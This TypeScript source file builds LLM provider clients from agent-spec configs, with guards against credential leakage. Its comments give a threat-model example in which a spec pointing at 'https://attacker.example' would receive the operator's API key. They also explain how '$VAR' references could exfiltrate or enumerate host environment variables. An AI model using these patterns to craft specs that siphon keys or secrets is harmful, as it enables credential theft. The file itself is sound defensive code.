import { isBuiltinComponentType } from 'agentspec';
import type { LLMConfig } from '../spec/types.js';
import type { ChatRequest, Provider } from './types.js';
import type { Dependencies } from '../node/types.js';
import type { PluginComponent } from '../plugin/types.js';
import { OpenAIProvider } from './openai.js';
import { LLMError } from '../errors.js';

/**
 * Supported OpenAI-compatible config types.
 * All of these use the OpenAI chat completions API under the hood.
 */
const OPENAI_COMPATIBLE_TYPES = new Set([
  'OpenAiConfig',
  'OpenAiCompatibleConfig',
  'VllmConfig',
  'OllamaConfig',
]);

/**
 * Whether this config type is one {@link createProvider} can build itself.
 *
 * Exported for {@link providerFor}, which has to know before it consults the
 * plugin registry: a builtin type never reaches a plugin, and that is the
 * property that keeps a plugin from capturing traffic a spec addressed to
 * `OpenAiConfig`. `PluginRegistry.claim` enforces the same thing from the other
 * side, at load — this is the half that holds even if a registry is not in play.
 */
export function isBuiltinConfigType(componentType: string): boolean {
  return OPENAI_COMPATIBLE_TYPES.has(componentType);
}

/**
 * If the value starts with `$`, treat it as an environment variable reference
 * and resolve it. Otherwise return the value as-is.
 *
 * `allowEnvRefs` exists because this is a read of the host's environment
 * directed by the spec, and a spec is not always written by the operator. A
 * flow that pairs `api_key: $ANY_VARIABLE` with a `url` the same flow chooses
 * will send that variable's value to that URL — the variable need not have
 * anything to do with a model. The "is not set" error below is an oracle too,
 * so the environment can be enumerated even when nothing is exfiltrated.
 *
 * Local use is the case this feature was built for and keeps working. Anywhere
 * specs arrive from callers, the reference has to be refused rather than
 * resolved.
 */
function resolveEnvVar(value: string, allowEnvRefs: boolean): string {
  if (value.startsWith('$')) {
    const key = value.slice(1);
    if (!allowEnvRefs) {
      throw new LLMError(
        `"${value}" refers to an environment variable. This server does not resolve ` +
          `those for specs it did not write — the reference is not limited to model ` +
          `keys, and the same spec chooses where the value would be sent. Put the ` +
          `credential in the spec, or omit it and use whatever this server provides. ` +
          `Running the spec yourself, ${value} resolves normally.`,
      );
    }
    const envValue = process.env[key];
    if (!envValue) {
      throw new LLMError(
        `environment variable "${key}" is not set (referenced as "${value}" in spec)`,
      );
    }
    return envValue;
  }
  return value;
}

/**
 * Creates an LLM Provider from a spec LLMConfig.
 *
 * All currently supported configs (OpenAI, vLLM, Ollama, OpenAI-compatible)
 * use the OpenAI SDK with different base URLs and optional API keys.
 */
export interface ProviderOptions {
  /**
   * Whether `$VAR` in a spec may read the host environment. Defaults to true,
   * which is right for a spec the operator wrote. Set false wherever the spec
   * came from a caller — see {@link resolveEnvVar}.
   */
  allowEnvRefs?: boolean;
  /**
   * A credential the operator supplies for specs that name none, so a caller
   * can run a flow without bringing a key. Both halves or neither: see
   * {@link applyDefaultCredential} for why the URL cannot be separated from it.
   */
  defaultUrl?: string;
  defaultKey?: string;
}

/**
 * Fill in the operator's credential, but only where doing so cannot hand it to
 * a caller.
 *
 * The rule is narrow and the reason is specific. A spec chooses its own `url`.
 * If the server filled in a key for a spec that named a URL, then
 *
 *   llm_config: { url: https://attacker.example }     # no api_key
 *
 * would have the operator's key attached and posted to that host. So the
 * default credential is only ever used with the default endpoint: a spec that
 * supplies a URL must supply its own key too, and is refused otherwise rather
 * than quietly falling back to no credential — a caller whose flow suddenly
 * ran unauthenticated would have no idea why it failed.
 */
function applyDefaultCredential(
  opts: { apiKey?: string; baseURL?: string },
  config: LLMConfig,
  options: ProviderOptions,
): void {
  const { defaultUrl, defaultKey } = options;
  if (!defaultKey) return;

  // The spec brought its own credential; nothing to supply.
  if (config.apiKey) return;

  if (config.url) {
    throw new LLMError(
      `this llm_config sets "url" but no "api_key". The server's own credential ` +
        `is only used with its own endpoint, so a flow that chooses where to send ` +
        `requests has to supply the key for them.`,
    );
  }

  opts.apiKey = defaultKey;
  if (defaultUrl) opts.baseURL = defaultUrl;
}

/** What a spec may set on `default_generation_parameters`, and what it means here. */
type Generation = Pick<ChatRequest, 'temperature' | 'maxTokens' | 'topP'>;

/**
 * The three settings, in both spellings a document can deliver them in.
 *
 * Not a convenience. `default_generation_parameters` holds a plain object, and
 * which case its *keys* arrive in depends on who deserialized the config around
 * it: the SDK camelCases the fields of a schema it knows, so a builtin
 * `OpenAiConfig` yields `maxTokens`; heddle's own plugin deserializer
 * camelCases a component's top-level fields and hands nested plain objects
 * through untouched — `loadField` treats them as user data — so a plugin
 * provider's config yields `max_tokens`.
 *
 * That difference is invisible to the person writing the spec, who wrote
 * `max_tokens` either way. Reading one spelling would silently drop a token
 * ceiling on exactly the configs heddle knows least about, so both are read.
 */
const GENERATION_KEYS: Array<[keyof Generation, string]> = [
  ['temperature', 'temperature'],
  ['maxTokens', 'max_tokens'],
  ['topP', 'top_p'],
];

/**
 * Read a spec's `default_generation_parameters` into a request.
 *
 * The field has been on `LLMConfig` since the type was written and was read
 * nowhere, so until now no spec could set a temperature or a token ceiling on
 * anything. Nothing about that was intentional; the request simply had no
 * fields to put them in.
 *
 * "Default" is the operative word: these are the settings for every call this
 * config makes, and a caller with a reason to differ on one call — a plugin
 * asking for a deterministic classification — overrides them per call. The
 * merge is in the caller's favour and lives at the merge site, not here.
 *
 * A value of the wrong type is refused rather than dropped. `LlmGenerationConfig`
 * is a passthrough schema, so `temperature: "0.7"` survives deserialization
 * intact, and dropping it silently would run the flow at the endpoint's default
 * while the spec plainly says otherwise. Unknown keys *are* dropped, because
 * passthrough is exactly how a spec written for another engine's parameters
 * reaches this one, and refusing those would make heddle the only engine that
 * cannot read such a spec at all.
 */
export function generationParams(config: LLMConfig): Generation {
  const raw = config.defaultGenerationParameters;
  if (!raw) return {};

  const params: Generation = {};
  for (const [key, alias] of GENERATION_KEYS) {
    // camelCase first: where both are present the SDK's own spelling wins,
    // rather than leaving it to key order in an object heddle did not build.
    const written = raw[key] !== undefined && raw[key] !== null ? key : alias;
    const value = raw[written];
    if (value === undefined || value === null) continue;
    if (typeof value !== 'number' || !Number.isFinite(value)) {
      throw new LLMError(
        `default_generation_parameters.${written} is ${JSON.stringify(value)}, which is ` +
          `not a number. These are sent to the model as written, so a string here ` +
          `is either rejected by the endpoint or silently ignored by it.`,
      );
    }
    params[key] = value;
  }
  return params;
}

/**
 * The one way anything in heddle gets a {@link Provider} from a spec's config.
 *
 * There used to be three call sites, each rebuilding the same options object
 * from the same three `Dependencies` fields — `AgentExecutor.getProvider`,
 * `LLMExecutor.execute` and `PluginModel.call`. Collapsing them is the whole of
 * what makes a provider plugin one change rather than three, and it is what the
 * roadmap means by `createProvider` becoming reachable through `Dependencies`
 * instead of being imported directly wherever a model is called.
 *
 * Two routes out, in this order and never the other: a plugin that claims the
 * config type, or `Dependencies.createProvider` — which defaults to
 * {@link createProvider} and covers only the types the SDK ships. The order is
 * what stops an embedder's stub from silently disabling every provider plugin
 * the operator loaded.
 *
 * **A plugin can only ever answer for a type the SDK does not ship**, and the
 * check that guarantees it is `isBuiltinComponentType` — the SDK's own, the same
 * one `PluginRegistry.claim` refuses a registration with. Two sets are in play
 * and they are not the same: `OPENAI_COMPATIBLE_TYPES` is what heddle can *build*
 * (four types), and the SDK's builtin map is what a plugin may not *claim*
 * (everything, including `OciGenAiConfig`). Gating the registry on the narrower
 * set would leave the invariant resting on the two happening to overlap, so both
 * are consulted and the SDK's comes first. Without that order a submitted plugin
 * could quietly become the endpoint for every flow on the server that never
 * named one.
 *
 * **What the plugin is given is the config, not the credential.** `deps` is
 * passed so a provider can reach the tool registry and the event handler; the
 * operator's `defaultLlmKey` is in it, and in process that is no new exposure —
 * a plugin loaded with `import()` is the same program as heddle and can read
 * anything. Out of process it is: `remoteProviderDef` sends the component and
 * the request and nothing else, so the operator's key never crosses the pipe.
 * A provider plugin that needs a credential takes it from its own component's
 * fields, which the flow's author wrote, or from the environment the operator
 * granted it.
 *
 * **`$VAR` is not resolved on the way.** `resolveEnvVar` exists because heddle
 * is the one sending the request to an endpoint the spec chose; here heddle
 * sends nothing. Resolving host-side would read the host's environment on a
 * plugin's behalf and hand the value to a process that is, under `--safe`,
 * confined precisely so it cannot see that environment — the same mistake
 * `ExecuteParams.workspace` refuses to make with a path. The config crosses as
 * written.
 */
export function providerFor(config: LLMConfig, deps: Dependencies): Provider {
  const componentType = config.componentType;

  if (componentType && !isBuiltinConfigType(componentType)) {
    // An Agent Spec builtin heddle has no client for — `OciGenAiConfig` is the
    // only one today, a member of `LlmConfigUnion` that `OPENAI_COMPATIBLE_TYPES`
    // does not list. Checked here rather than left to fall through, because the
    // two sets not agreeing is exactly what makes the fall-through wrong: a
    // plugin can never supply this type (`claim` refuses a builtin component
    // type), so the registry has nothing to say and "load it with --plugin"
    // would send an operator looking for something that cannot be built.
    //
    // It also makes the double lock a real one. Every SDK builtin now stops
    // before the registry lookup, whether or not heddle can build it, so the
    // guarantee no longer rests on the two sets happening to overlap where it
    // matters.
    if (isBuiltinComponentType(componentType)) {
      throw new LLMError(
        `llm_config has type "${componentType}", which Agent Spec defines but heddle ` +
          `has no client for. heddle speaks: ${[...OPENAI_COMPATIBLE_TYPES].join(', ')}. ` +
          `No plugin can supply it either — a plugin may not claim a builtin component ` +
          `type — so this flow needs one of those, or an endpoint reached through ` +
          `OpenAiCompatibleConfig.`,
      );
    }
  }

  const registry = deps.plugins;

  if (componentType && registry && !isBuiltinConfigType(componentType)) {
    const def = registry.providerDef(componentType);
    if (def) {
      return def.createProvider(config as unknown as PluginComponent, deps);
    }

    // The slot discipline the widened `LlmConfigUnion` gave up, recovered here
    // and named. Before widening this was `Invalid discriminator value`; a
    // plugin's transform written as an `llm_config` now parses, and this is
    // where it stops — saying what the type actually is rather than what it is
    // not.
    const kind = registry.kindOf(componentType);
    if (kind) {
      throw new LLMError(
        `llm_config has type "${componentType}", which a plugin provides as a ` +
          `${kind} rather than a provider. Only a "provider" component supplies a ` +
          `model endpoint; a ${kind} is written somewhere else in the spec.`,
      );
    }

    throw new LLMError(
      `unsupported config type "${componentType}". Builtin: ` +
        `${[...OPENAI_COMPATIBLE_TYPES].join(', ')}.\n` +
        `  Loaded plugins: ${registry.describe()}\n` +
        `  If it comes from a plugin, load it with: --plugin <module>`,
    );
  }

  return (deps.createProvider ?? createProvider)(config, {
    allowEnvRefs: deps.allowEnvRefs,
    defaultKey: deps.defaultLlmKey,
    defaultUrl: deps.defaultLlmUrl,
  });
}

export function createProvider(
  config: LLMConfig,
  options: ProviderOptions = {},
): Provider {
  const allowEnvRefs = options.allowEnvRefs ?? true;
  const configType = config.componentType ?? 'OpenAiConfig';

  if (!OPENAI_COMPATIBLE_TYPES.has(configType)) {
    throw new LLMError(
      `unsupported config type "${configType}". ` +
        `Supported: ${[...OPENAI_COMPATIBLE_TYPES].join(', ')}`,
    );
  }

  const opts: { apiKey?: string; baseURL?: string } = {};

  if (config.apiKey) {
    opts.apiKey = resolveEnvVar(config.apiKey, allowEnvRefs);
  }

  if (config.url) {
    opts.baseURL = config.url;
  }

  applyDefaultCredential(opts, config, options);

  return new OpenAIProvider(opts);
}
